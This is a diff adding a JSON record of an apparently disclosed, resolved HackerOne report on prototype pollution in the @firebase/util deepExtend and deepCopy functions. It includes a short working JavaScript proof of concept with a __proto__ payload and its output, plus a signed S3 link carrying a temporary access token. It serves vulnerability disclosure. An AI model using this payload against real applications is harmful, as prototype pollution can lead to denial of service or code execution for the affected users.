@@ -1,0 +1,117 @@
+{
+  "id": 1001218,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDAxMjE4",
+  "url": "https://hackerone.com/reports/1001218",
+  "title": "[@firebase/util] Prototype pollution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-10-07T15:00:05.498Z",
+  "submitted_at": "2020-10-07T15:00:05.559Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-17T17:42:42.628Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-17T17:42:42.568Z",
+  "team_member_agreed_on_going_public_at": "2020-11-17T12:02:01.503Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Module\n\n**module name:** `@firebase/util`\n**version:** `0.3.2`\n**npm page:** `https://www.npmjs.com/package/@firebase/util`\n\n## Module Description\n\nNOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package\n\nThis is a wrapper of some Webchannel Features for the Firebase JS SDK.\n\n## Module Stats\n\n[1,516,157] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nI tested the [`deepCopy`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) and [`deepExtend`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) functions.\n\nThe `deepCopy` and `deepExtend` functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `@firebase/util` module:\n    - `npm i ``@firebase/util`\n\nRun the following poc:\n```javascript\nconst utils = require('@firebase/util');\n\nconst obj = {};\nconst source = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\nconsole.log(\"Before : \" + obj.polluted);\nutils.deepExtend({}, source);\n// utils.deepCopy(source);\nconsole.log(\"After : \" + obj.polluted);\n\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F1024346}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.11.0\n- NPM VERSION: 6.14.8\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1024346,
+      "file_name": "firebase_util_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eHvqvfPk89hFAHyg1NBu75Cw?response-content-disposition=attachment%3B%20filename%3D%22firebase_util_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27firebase_util_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ5563KCL%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T235036Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH2mUTI4P0SnQ5ajzSfxoNdCBKYmrjJfByUStPIGEq5RAiB%2FqUu6kExNyEo%2BSniG%2FMuuleX0HIunQ5AF1aCiP%2Fvo%2Fiq6BQig%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM30Us4d9hj10RmP7uKo4FaLw9G1a6LglaMko9qea%2FRmj%2F3t%2BVM51DMmcnrniUSvG7c0ZXY9tSUGO%2FFJeX39tj5pG83x3HQWGn%2FuMXxv626AP9H9psNDsy7H8NZ1X9njwOxuK8kuPxW6zMzDK42KsGkafS%2FOgMUV6AUQXNjF04DUYhsUeJqiBl7qzav3iuDL7ioML%2BFhV2WY0MVz34A1iyK%2BGFCXxWGRGEj2haRXXzDnobw1UUcBfa%2FsuBPOvNAirQSIGSxoZ2HFY40WMVbh0IqyfLYlIaplndsw70VKZhRFuRA9OjPQGcfkUXYv9Y9cKtadPabWi6x8nY74NGRePRdkJTlPoc2ovq3p3ggYPBcO4cGxQPZ%2FoqAQ8BJx7nec%2Fb1lFP5p7X5RwAAbVhz%2FAvTCsVOWzoxH8%2FWk47qMKLrxBQEH0ca4nnRrVR18HI%2FImSJOoq%2BCN94mX6pSTf73vcqId53vgtZGaXJbCmb2q4ZhutskAXTC43wtfyF%2FsD%2Fn4o1ZIdNHSLbHPHc%2B7UEhmoD0kQlKmPLA6gAPIYk7cFyeA1YPl1%2BP1RK512rHF1PelVwFAkUuk73sTZHwW5dKT4x%2FFENummEgBfos2S8OHDOpl%2FglMyeQmVzvgk0PH2GA6%2BnixJxM%2F39I4cstKRHv4Q%2Bne0DwhhNlsJNcc9TjdU9Upp1lFgwfhWclO2yc4esIj%2F490nT6S5GhWFV3bK7%2BjBx7gkoCBE%2FnMXnvKSBzxXuKoP23jGiLgN1CCNiMZDre5nRKlfbEHn8LuK%2Fu6N%2Fq6g34XL51DJ04xpI6UBkCMHw%2BEB%2B9p0BvSfQntsJyNMHal1pTOBkAkpWBu9BhikwkTNjfPgFL%2BcOu%2F0hyBdBGLOyCOhfgY7ERXAaSLqbzUVMOzM48wGOrIB6rVEanPToOQLVhAyFcKlsLtJEWQB8ng5eXPVD1sHqsB3BZzfcy6J74zSYfhff5lSlYlpbIkvegqt5irfvwHxYOO9nK2b4kKQc%2FUj5CcOblEnfkC4dK4TYavIqs7Uk1mydQeDlETvmxxKqVxqhq6wPgZ40SeV%2BEECVAhWEswtTLGEfeWLCXBZODM5572x7xKBQ3wN9wimakqFXfngg0QGIKoSk0CwgTfwoPDda5A0oL6quQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a4d5c471138282c6273f172aa9a401a11a7ac0d3e130302d91463f72014466c5",
+      "file_size": 1637524,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-12-17T12:02:01.595Z",
+  "allow_singular_disclosure_after": -163424915.09276766,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 58813,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "@firebase/util",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
